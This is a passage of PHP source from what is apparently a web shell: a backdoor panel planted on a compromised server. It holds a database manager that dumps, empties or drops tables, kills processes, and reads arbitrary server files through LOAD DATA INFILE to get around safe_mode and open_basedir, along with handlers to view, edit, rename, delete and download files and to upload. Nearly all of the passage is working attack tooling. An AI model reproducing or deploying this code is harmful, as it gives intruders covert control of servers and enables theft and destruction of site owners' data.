$diplay = TRUE;
if (@$sql_db) {
  if (!is_numeric($c)) { $c = 0; }
  if ($c == 0) { $c = "no"; }
  echo "\t<center><b>There are ".$c." table(s) in database: ".htmlspecialchars($sql_db)."";
  if (count(@$dbquicklaunch) > 0) {
foreach($dbsqlquicklaunch as $item) {
  echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";
}
  }
  echo "</b></center>\n";
  $xs = array("","dump");
  if ($sql_x == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_x = "query";}
  elseif ($sql_x == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_x = "dump";}
  elseif ($sql_x == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_x = "query";}
  elseif ($sql_x == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_x = "query";}
  elseif ($sql_tbl_x == "insert") {
if ($sql_tbl_insert_radio == 1) {
  $keys = "";
  $akeys = array_keys($sql_tbl_insert);
  foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
  if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
  $values = "";
  $i = 0;
  foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
  if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
  $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
  $sql_x = "query";
  $sql_tbl_x = "browse";
}
elseif ($sql_tbl_insert_radio == 2) {
  $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
  $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
  $result = mysql_query($sql_query) or print(mysql_smarterror());
  $result = mysql_fetch_array($result, MYSQL_ASSOC);
  $sql_x = "query";
  $sql_tbl_x = "browse";
}
  }
  if ($sql_x == "query") {
echo "<hr size=\"1\" noshade>";
if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
if ($sql_query_result or (!$sql_confirm)) {$sql_x = $sql_goto;}
if ((!$submit) or ($sql_x)) { echo "<table class='tab'><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_x\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> <input type=\"submit\" value=\"No\"></form></td></tr></table>"; }
  }
  if (in_array($sql_x,$xs)) {
echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;">
<b>Create new table:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newtbl">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="sql_newtbl" size="20">
Fields: <input type="text" name="sql_field" size="3">
<input class="inputzbut" type="submit" value="Create">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>Dump DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="dump">
<input type="hidden" name="sql_db" value="'.htmlspecialchars($sql_db).'">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input type="text" name="dump_file" size="30" value="dump_'.getenv("SERVER_NAME").'_'.$sql_db.'_'.date("d-m-Y-H-i-s").'.sql">
<input type="submit" class="inputzbut" name="submit" value="Dump">
</form>
</td>
</tr>
</table>';
if (!empty($sql_x)) { echo "<hr size=\"1\" noshade>"; }
if ($sql_x == "newtbl") {
  echo "<b>";
  if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
  }
  else { echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror(); }
}
elseif ($sql_x == "dump") {
  if (empty($submit)) {
$diplay = FALSE;
echo "<form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_x\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";
echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
$v = join (";",$dmptbls);
echo "<b>Only tables (explode \";\") :</b> <input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
if ($dump_file) {$tmp = $dump_file;}
else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
echo "<b>File:</b> <input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
echo "<b>Download: </b> <input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
echo "<b>Save to file: </b> <input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
echo "<br><br><input class=\"inputzbut\" type=\"submit\" name=\"submit\" value=\"Dump\">";
echo "</form>";
  }
  else {
$diplay = TRUE; $set = array(); $set["sock"] = $sql_sock; $set["db"] = $sql_db; $dump_out = "download"; $set["print"] = 0;
$set["nl2br"] = 0; $set[""] = 0; $set["file"] = $dump_file; $set["add_drop"] = TRUE; $set["onlytabs"] = array();
if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
$ret = mysql_dump($set);
if ($sql_dump_download) {
  @ob_clean();
  header("Content-type: application/octet-stream");
  header("Content-length: ".strlen($ret));
  header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
  echo $ret;
  exit;
}
elseif ($sql_dump_savetofile) {
  $fp = fopen($sql_dump_file,"w");
  if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
  else {
fwrite($fp,$ret);
fclose($fp);
echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
  }
}
else {echo "<b>Dump: nothing to do!</b>";}
  }
}
if ($diplay) {
  if (!empty($sql_tbl)) {
  if (empty($sql_tbl_x)) {$sql_tbl_x = "browse";}
  $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
  $count_row = mysql_fetch_array($count);
  mysql_free_result($count);
  $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
$tbl_struct_fields = array();
while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
  if (@$sql_ls > @$sql_le) { $sql_le = $sql_ls + $perpage; }
  if (empty($sql_tbl_page)) { $sql_tbl_page = 0; }
  if (empty($sql_tbl_ls)) { $sql_tbl_ls = 0; }
  if (empty($sql_tbl_le)) { $sql_tbl_le = 30; }
  $perpage = $sql_tbl_le - $sql_tbl_ls;
  if (!is_numeric($perpage)) { $perpage = 10; }
  $numpages = $count_row[0]/$perpage;
  $e = explode(" ",$sql_order);
  if (count($e) == 2) {
if ($e[0] == "d") { $asc_desc = "DESC"; }
else { $asc_desc = "ASC"; }
$v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
  }
  else {$v = "";}
  $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
  $result = mysql_query($query) or print(mysql_smarterror());
  echo "<center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
  echo "<hr size=\"1\" noshade>";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=structure\">[<b> Structure </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=browse\">[<b> Browse </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_x=tbldump&thistbl=1\">[<b> Dump </b>]</a> &nbsp; ";
  echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_x=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a> &nbsp; ";
  if ($sql_tbl_x == "structure") { echo "<b>Under construction!</b>"; }
  if ($sql_tbl_x == "insert") {
if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
if (!empty($sql_tbl_insert_radio)) { echo "<b>Under construction!</b>"; }
else {
  echo "<br><br><b>Inserting row into table:</b><br>";
  if (!empty($sql_tbl_insert_q)) {
$sql_query = "SELECT * FROM `".$sql_tbl."`";
$sql_query .= " WHERE".$sql_tbl_insert_q;
$sql_query .= " LIMIT 1;";
$result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
$values = mysql_fetch_assoc($result);
mysql_free_result($result);
  }
  else {$values = array();}
  echo "<form method=\"POST\"><table width=\"1%\" class='tub'><tr><th><b>Field</b></th><th><b>Type</b></th><th><b>Function</b></th><th><b>Value</b></th></tr>";
  foreach ($tbl_struct_fields as $field) {
$name = $field["Field"];
if (empty($sql_tbl_insert_q)) {$v = "";}
echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
$i++;
  }
  echo "</table><br>";
  echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
  if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
  echo "<br><br><input class=\"inputzbut\" type=\"submit\" value=\"Confirm\"></form>";
}
  }
  if ($sql_tbl_x == "browse") {
$sql_tbl_ls = abs($sql_tbl_ls);
$sql_tbl_le = abs($sql_tbl_le);
echo "<hr size=\"1\" noshade>";
echo "<b>Page: </b>";
$b = 0;
for($i=0;$i<$numpages;$i++) {
  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}
  echo $i;
  if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
  if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
  else { echo " "; }
}
if ($i == 0) {echo "empty";}
echo "<br><br><form method=\"GET\"><input type=\"hidden\" name=\"x\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b> <input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"> <b>To:</b> <input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"> <input type=\"submit\" value=\"View\"></form>";
echo "<br><form method=\"POST\">\n";
echo "<table class='tub'><tr>";
echo "<th><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></th>";
for ($i=0;$i<mysql_num_fields($result);$i++) {
  $v = mysql_field_name($result,$i);
  if ($e[0] == "a") {$s = "d"; $m = "asc";}
  else {$s = "a"; $m = "desc";}
  echo "<th>";
  if (empty($e[0])) {$e[0] = "a";}
  if (@$e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}
  else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."x=img&img=sort_".$m."\" alt=\"".$m."\"></a>";}
  echo "</th>";
}
echo "<th><font color=\"#00FF00\"><b>action</b></font></th>";
echo "</tr>";
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
  echo "<tr>";
  $w = "";
  $i = 0;
  foreach ($row as $k=>$v) {
$name = mysql_field_name($result,$i);
$w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;
  }
  if (count($row) > 0) { $w = substr($w,0,strlen($w)-3); }
  echo "<td align='center' style='padding:0px;'><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
  $i = 0;
  foreach ($row as $k=>$v) {
$v = htmlspecialchars($v);
if ($v == "") { $v = "<font color=\"#00FF00\">NULL</font>"; }
echo "<td>".$v."</td>";
$i++;
  }
  echo "<td>";
  echo "<a href=\"".$sql_surl."sql_x=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\">Delete</a>";
  echo "&nbsp;|&nbsp;";
  echo "<a href=\"".$sql_surl."sql_tbl_x=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\">Edit</a> ";
  echo "</td>";
  echo "</tr>";
}
mysql_free_result($result);
echo "</table><hr size=\"1\" noshade><p align=\"left\"><input type=\"checkbox\"/> <select name=\"sql_x\">";
echo "<option value=\"\">With selected:</option>";
echo "<option value=\"deleterow\">Delete</option>";
echo "</select> <input class=\"inputzbut\" type=\"submit\" value=\"Confirm\"></form></p>";
}
 }
 else {
$result = mysql_query("SHOW TABLE STATUS", $sql_sock);
if (!$result) { echo mysql_smarterror(); }
else {
echo '<form method="POST">
<table class="tub">
<tr><th><input type="checkbox" name="boxtbl_all" value="1"></th><th>Table</th><th>Rows</th><th>Engine</th><th>Created</th><th>Modified</th><th>Size</th><th>Action</th></tr>';
 $i = 0;
 $tsize = $trows = 0;
 while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
$tsize += $row["Data_length"];
$trows += $row["Rows"];
$size = view_size($row["Data_length"]);
echo'<tr>
<td align="center" style="padding:0px;"><input type="checkbox" name="boxtbl[]" value="'.$row["Name"].'"></td>
<td><a href="'.$sql_surl.'sql_tbl='.urlencode($row["Name"]).'"><b>'.$row["Name"].'</b></a></td>
<td>'.$row["Rows"].'</td><td>'.$row["Engine"].'</td><td>'.$row["Create_time"].'</td><td>'.$row["Update_time"].'</td><td>'.$size.'</td>
<td><a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DELETE FROM `".$row["Name"]."`").'">Empty</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_x=query&sql_query='.urlencode("DROP TABLE `".$row["Name"]."`").'">Drop</a>&nbsp;|&nbsp;<a href="'.$sql_surl.'sql_tbl_x=insert&sql_tbl='.$row["Name"].'">Insert</a></td>
</tr>';
$i++;
 }
 echo "\t\t<tr>\n".
"\t\t<th>+</th><th>$i table(s)</th><th>$trows</th><th>$row[1]</th><th>$row[10]</th><th>$row[11]</th><th>".view_size($tsize)."</th><th></th>\n";
echo'</tr>
</table>
<div align="right">
<select class="inputz" name="sql_x">
<option value="">With selected:</option>
<option value="tbldrop">Drop</option>
<option value="tblempty">Empty</option>";
<option value="tbldump">Dump</option>";
<option value="tblcheck">Check table</option>";
<option value="tbloptimize">Optimize table</option>";
<option value="tblrepair">Repair table</option>";
<option value="tblanalyze">Analyze table</option>";
</select>
<input class="inputzbut" type="submit" value="Confirm">
</div>
</form>';
 mysql_free_result($result);
}
 }
}
 }
}
else {
$xs = array("","newdb","serverstatus","servervars","processes","getfile");
if (in_array($sql_x,$xs)) {
echo '<table class="tab">
<tr>
<td style="border:1px solid #333333;padding:3px;"><b>Create new DB:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="newdb">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input class="inputz" type="text" name="sql_newdb" size="20">
<input class="inputzbut"  type="submit" value="Create">
</form>
</td>
<td style="border:1px solid #333333;padding:3px;"><b>View File:</b>
<form action="'.$surl.'">
<input type="hidden" name="x" value="sql">
<input type="hidden" name="sql_x" value="getfile">
<input type="hidden" name="sql_login" value="'.htmlspecialchars($sql_login).'">
<input type="hidden" name="sql_passwd" value="'.htmlspecialchars($sql_passwd).'">
<input type="hidden" name="sql_server" value="'.htmlspecialchars($sql_server).'">
<input type="hidden" name="sql_port" value="'.htmlspecialchars($sql_port).'">
<input class="inputz" type="text" name="sql_getfile" size="30" value="'.htmlspecialchars($sql_getfile).'">
<input class="inputzbut" type="submit" value="Get">
</form>
</td>
</tr>
</table>';
}
if (!empty($sql_x)) {
 echo "<hr size=\"1\" noshade>";
 if ($sql_x == "newdb") {
echo "<b>";
if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
 }
 if ($sql_x == "serverstatus") {
$result = mysql_query("SHOW STATUS", $sql_sock);
echo "<center><b>Server status variables:</b><br><br>";
echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
echo "</table></center>";
mysql_free_result($result);
 }
 if ($sql_x == "servervars") {
$result = mysql_query("SHOW VARIABLES", $sql_sock);
echo "<center><b>Server variables:</b><br><br>";
echo "<table class='tub'><th><b>Name</b></th><th><b>Value</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
echo "</table>";
mysql_free_result($result);
 }
 if ($sql_x == "processes") {
if (!empty($kill)) {
 $query = "KILL ".$kill.";";
 $result = mysql_query($query, $sql_sock);
 echo "<b>Process #".$kill." was killed.</b>";
}
$result = mysql_query("SHOW PROCESSLIST", $sql_sock);
echo "<center><b>Processes:</b><br><br>";
echo "<table class='tub'><th><b>ID</b></th><th><b>USER</b></th><th><b>HOST</b></th><th><b>DB</b></th><th><b>COMMAND</b></th><th><b>TIME</b></th><th><b>STATE</b></th><th><b>INFO</b></th><th><b>Action</b></th></tr>";
while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_x=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
echo "</table>";
mysql_free_result($result);
 }
 if ($sql_x == "getfile") {
$tmpdb = $sql_login."_tmpdb";
$select = mysql_select_db($tmpdb);
if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
if ($select) {
 $created = FALSE;
 mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
 mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
 $result = mysql_query("SELECT * FROM tmp_file;");
 if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
 else {
for ($i=0;$i<mysql_num_fields($result);$i++) { $name = mysql_field_name($result,$i); }
$f = "";
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) { $f .= join ("\r\n",$row); }
if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
mysql_free_result($result);
mysql_query("DROP TABLE tmp_file;");
 }
}
mysql_drop_db($tmpdb);
 }
}
 }
}
echo '</td></tr>';
if ($sql_sock) {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)) { $affected = 0; }
  echo "\t<tr><th colspan=2>Affected rows: $affected</th></tr>";
}
echo '</table></center>';
  }
echo '</form>';
}
}
//*--------------------------------[ batas ]--------------------------------*//


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){ @ini_set('output_buffering',0); 
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}
elseif(isset($_GET['view']) && ($_GET['view'] != "")){
  if(is_file($_GET['view'])){ 
	if(!isset($file)) $file = magicboom($_GET['view']);
	if(!$win && $posix){
		$name=@posix_getpwuid(@fileowner($folder));
		$group=@posix_getgrgid(@filegroup($folder));
		$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
	}
	else {
		$owner = $user;
	}
	$filn = basename($file);
	echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\">
	<tr><td>Filename</td><td><span id=\"".clearspace($filn)."_link\">".$file."</span>
	<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"Rename\" value=\"Rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"Cancel\" value=\"Cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" />
	</form>
	</td></tr>
	<tr><td>Size</td><td>".ukuran($file)."</td></tr>
	<tr><td>Permission</td><td>".get_perms($file)."</td></tr>
	<tr><td>Owner</td><td>".$owner."</td></tr>
	<tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr>
	<tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr>
	<tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr>
	<tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">Edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">Rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">Delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">Download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">GZip</a>)</td></tr>
	<tr><td>View</td><td><a href=\"?y=".$pwd."&amp;view=".$file."\">Text</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">Code</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">Image</a></td></tr>
	</table>
	";
	if(isset($_GET['type']) && ($_GET['type']=='image')){
		echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>";
	}
	elseif(isset($_GET['type']) && ($_GET['type']=='code')){
		echo "<div class=\"viewfile\">";
		$file = wordwrap(@file_get_contents($file),"240","\n");
		@highlight_string($file);
		echo "</div>";
	}
	else {
		echo "<div class=\"viewfile\">";
		echo nl2br(htmlentities((@file_get_contents($file))));
		echo "</div>";
	}
  }
  elseif(is_dir($_GET['view'])){
		echo showdir($pwd,$prompt);
  }
	
}
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){@ini_set('output_buffering',0); 

		if(isset($_POST['save'])){
			$file = $_POST['saveas'];
			$content = magicboom($_POST['content']);
			if($filez = @fopen($file,"w")){
				$time = date("d-M-Y H:i",time());
				if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
				else $msg = "failed to save";
				@fclose($filez);
			}
			else $msg = "permission denied";
		}
		if(!isset($file)) $file = $_GET['edit'];
		if($filez = @fopen($file,"r")){
			$content = "";
			while(!feof($filez)){
				$content .= htmlentities(str_replace("''","'",fgets($filez)));
			}
			@fclose($filez);
		}
	
?>
<form action="?y=<?=$pwd; ?>&amp;edit=<?=$file; ?>" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" name="content">
<?=$content; ?>
</textarea>
<tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?=$file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" />
&nbsp;<?=$msg; ?></td></tr>
</table>
</form>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'logout'))
{	
?>
<form action="?y=<?=$pwd; ?>&amp;x=logout" method="post">

<?php
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo "<br /><br /><center>Byee !!!!!!</center>"; 
}

//////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){ @ini_set('output_buffering',0); 
echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
